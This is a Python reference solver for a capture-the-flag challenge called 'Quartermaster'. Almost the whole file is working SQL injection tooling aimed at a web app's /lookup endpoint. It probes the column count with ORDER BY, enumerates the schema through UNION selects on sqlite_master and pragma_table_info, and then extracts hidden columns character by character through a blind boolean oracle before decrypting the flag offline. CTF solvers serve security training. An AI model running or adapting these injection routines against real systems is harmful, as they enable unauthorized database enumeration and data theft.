#!/usr/bin/env python3
"""
ZSCTF :: Quartermaster -- reference solver.

Intended path. The SQL-injection crux (a query built by string concatenation)
grants the oracle; a bespoke BLIND, two-channel extraction layered on top turns
that oracle into the flag. Nothing here is hardcoded to a seed.

  0. GET /whoami              -> sanity: confirm this is a Quartermaster instance.
  1. COLUMN COUNT. Probe `... ORDER BY N` with increasing N; the DB errors once N
     exceeds the real arity (reflected back). The last good N is the arity (4).
  2. FIND THE RESTRICTED TABLE. The flag is NOT in `assets`, so UNION-select the
     table list from `sqlite_master`; the non-`assets`, non-`sqlite_%` table is
     the per-instance restricted custody registry.
  3. FIND ITS COLUMNS. `pragma_table_info(<table>)` via UNION. Two seed-named
     columns carry the enciphered flag: `ct_<hex>` (ciphertext) and `km_<hex>`
     (key material). The flag is stored NOWHERE in plaintext.
  4. BLIND EXTRACTION (the extraction layer). Neither channel is dumped in bulk;
     each is leaked CHARACTER BY CHARACTER through a BOOLEAN + LENGTH side
     channel: inject `__none__' OR <predicate> -- `. When <predicate> is true the
     base query returns the public inventory (count > 0); when false it returns
     nothing (count == 0). With
         length((SELECT <col> FROM <tbl> WHERE id=R))         -> channel length
         unicode(substr((SELECT <col> FROM <tbl> WHERE id=R),k,1)) <= V
     we binary-search each character. The ciphertext/key never appear in a
     response -- only the boolean does.
  5. UNSCRAMBLE OFFLINE. keymat = KMASK_HEX || PERM_HEX. Expand K from KMASK_HEX,
     derive the permutation P from PERM_HEX, then  flag[P[i]] = ct[i] XOR K[i].
     Un-XOR WITHOUT un-permuting yields a scrambled near-flag (rejectable); the
     decoy custody row unscrambles to a hyphenated near-flag (rejectable). We
     keep only the candidate that matches the published strict validator.

Usage:
    python solve.py --url http://HOST:PORT
"""
import re
import sys
import json
import hashlib
import argparse
from urllib.parse import urlencode
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

FLAG_RE = re.compile(r"zerosecurectf\{[^}]*\}")
# the PUBLISHED strict validator -- the discriminator that rejects every decoy.
STRICT_FLAG = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


# ---------------------------------------------------------------------------
# transport
# ---------------------------------------------------------------------------
def lookup(base, tag_value, timeout=20):
    """Send one crafted tag to /lookup and return (raw_text, parsed_json)."""
    url = base.rstrip("/") + "/lookup?" + urlencode({"tag": tag_value})
    req = Request(url, headers={"Accept": "application/json"})
    try:
        with urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    try:
        return raw, json.loads(raw)
    except Exception:
        return raw, {"ok": None, "raw": raw}


def union(select_exprs, from_clause, col_count):
    """Build a UNION payload padded to `col_count` result columns."""
    exprs = list(select_exprs)
    while len(exprs) < col_count:
        exprs.append("''")
    exprs = exprs[:col_count]
    return "__none__' UNION SELECT " + ", ".join(exprs) + " FROM " + from_clause + " -- "


# ---------------------------------------------------------------------------
# steps 1-3: the classic UNION crux (unchanged -- this grants the oracle)
# ---------------------------------------------------------------------------
def find_column_count(base, limit=25):
    """Probe `ORDER BY N` until the DB complains; return the last good N."""
    last_ok = 0
    for n in range(1, limit + 1):
        _, j = lookup(base, "__none__' ORDER BY %d -- " % n)
        if j.get("ok"):
            last_ok = n
        else:
            break
    if last_ok == 0:
        raise SystemExit("[-] could not determine column count (no ORDER BY N succeeded)")
    return last_ok


def find_restricted_table(base, cc):
    payload = union(["name"], "sqlite_master WHERE type='table' "
                              "AND name<>'assets' AND name NOT LIKE 'sqlite_%'", cc)
    _, j = lookup(base, payload)
    if not j.get("ok"):
        raise SystemExit("[-] schema enumeration failed: %s" % j.get("error"))
    names = [row[0] for row in j.get("rows", []) if row and row[0]]
    if not names:
        raise SystemExit("[-] no restricted table found alongside `assets`")
    return names[0]


def find_columns(base, table, cc):
    payload = union(["name"], "pragma_table_info('%s')" % table, cc)
    _, j = lookup(base, payload)
    if not j.get("ok"):
        raise SystemExit("[-] pragma_table_info failed: %s" % j.get("error"))
    cols = [row[0] for row in j.get("rows", []) if row and row[0]]
    if not cols:
        raise SystemExit("[-] could not read columns of %s" % table)
    return cols


def count_rows(base, table, cc):
    """How many rows the restricted registry holds (so we try each custody id)."""
    payload = union(["count(*)"], table, cc)
    _, j = lookup(base, payload)
    try:
        return int(j["rows"][0][0])
    except Exception:
        return 2


# ---------------------------------------------------------------------------
# step 4: the BLIND boolean + length oracle (the extraction layer)
# ---------------------------------------------------------------------------
def oracle(base, predicate, timeout=20):
    """True iff the injected boolean predicate holds (base query returns rows)."""
    _, j = lookup(base, "__none__' OR (" + predicate + ") -- ", timeout=timeout)
    return bool(j.get("ok")) and j.get("count", 0) > 0


def blind_length(base, expr, hi=512):
    """Binary-search length(expr) using the boolean oracle."""
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(base, "length((%s)) <= %d" % (expr, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def blind_string(base, expr, n):
    """Leak expr character-by-character via the boolean oracle (binary search
    over each codepoint). The value itself is never reflected -- only booleans."""
    out = []
    for k in range(1, n + 1):
        lo, hi = 0, 0x7f
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(base, "unicode(substr((%s),%d,1)) <= %d" % (expr, k, mid)):
                hi = mid
            else:
                lo = mid + 1
        out.append(chr(lo))
    return "".join(out)


# ---------------------------------------------------------------------------
# step 5: offline unscramble  (mirrors the published custody cipher)
# ---------------------------------------------------------------------------
def _keystream(seed_hex, n):
    out = bytearray()
    c = 0
    base = seed_hex.encode()
    while len(out) < n:
        out += hashlib.sha256(base + b":" + str(c).encode()).digest()
        c += 1
    return bytes(out[:n])


def _permutation(seed_hex, n):
    idx = list(range(n))
    rnd = _keystream(seed_hex, 4 * n)
    for i in range(n - 1, 0, -1):
        j = int.from_bytes(rnd[4 * i:4 * i + 4], "big") % (i + 1)
        idx[i], idx[j] = idx[j], idx[i]
    return idx


def unscramble(ct_hex, keymat):
    """ct[i] = plain[P[i]] XOR K[i]  =>  plain[P[i]] = ct[i] XOR K[i]."""
    half = len(keymat) // 2
    kmask_hex, perm_hex = keymat[:half], keymat[half:]
    ct = bytes.fromhex(ct_hex)
    n = len(ct)
    K = _keystream(kmask_hex, n)
    P = _permutation(perm_hex, n)
    permuted_plain = bytes(ct[i] ^ K[i] for i in range(n))      # == plain[P[i]]
    plain = bytearray(n)
    for i in range(n):
        plain[P[i]] = permuted_plain[i]
    return plain.decode("latin-1"), permuted_plain.decode("latin-1")


def extract_record(base, table, ct_col, key_col, rid):
    """Blind-extract both channels for one custody row, then unscramble offline."""
    ct_expr = "SELECT %s FROM %s WHERE id=%d" % (ct_col, table, rid)
    km_expr = "SELECT %s FROM %s WHERE id=%d" % (key_col, table, rid)
    ct_len = blind_length(base, ct_expr)
    if ct_len == 0:
        return None
    ct_hex = blind_string(base, ct_expr, ct_len)
    km_len = blind_length(base, km_expr)
    keymat = blind_string(base, km_expr, km_len)
    try:
        plain, permuted = unscramble(ct_hex, keymat)
    except Exception:
        return None
    return {"id": rid, "ct_hex": ct_hex, "keymat": keymat,
            "plain": plain, "skip_unscramble": permuted}


# ---------------------------------------------------------------------------
def solve(base):
    try:
        with urlopen(base.rstrip("/") + "/whoami", timeout=15) as r:
            who = json.loads(r.read().decode("utf-8", "replace"))
        print("[*] target is '%s', instance %s" % (who.get("service"), who.get("fingerprint")))
    except Exception:
        print("[*] /whoami unavailable; continuing anyway")

    cc = find_column_count(base)
    print("[+] column count of the base query = %d" % cc)

    table = find_restricted_table(base, cc)
    print("[+] restricted registry table = %s" % table)

    cols = find_columns(base, table, cc)
    print("[+] its columns = %s" % ", ".join(cols))

    ct_col = next((c for c in cols if c.startswith("ct_")), None)
    key_col = next((c for c in cols if c.startswith("km_")), None)
    if not ct_col or not key_col:
        raise SystemExit("[-] could not locate the enciphered-channel columns (ct_* / km_*)")
    print("[+] ciphertext channel = %s ; key-material channel = %s" % (ct_col, key_col))

    nrows = count_rows(base, table, cc)
    print("[+] custody rows to examine = %d" % nrows)

    flag = None
    for rid in range(1, nrows + 1):
        rec = extract_record(base, table, ct_col, key_col, rid)
        if not rec:
            continue
        ok = bool(STRICT_FLAG.match(rec["plain"]))
        tag = "FLAG" if ok else "decoy (rejected by strict validator)"
        print("[+] custody id=%d -> %s  [%s]" % (rid, rec["plain"], tag))
        print("      (skip-un-permute near-flag was: %r)" % rec["skip_unscramble"])
        if ok and flag is None:
            flag = rec["plain"]

    if not flag:
        raise SystemExit("[-] blind extraction finished but no candidate matched the strict validator")
    return flag


def main():
    ap = argparse.ArgumentParser(
        description="Quartermaster reference solver (UNION SQLi -> blind two-channel extraction).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Quartermaster app")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
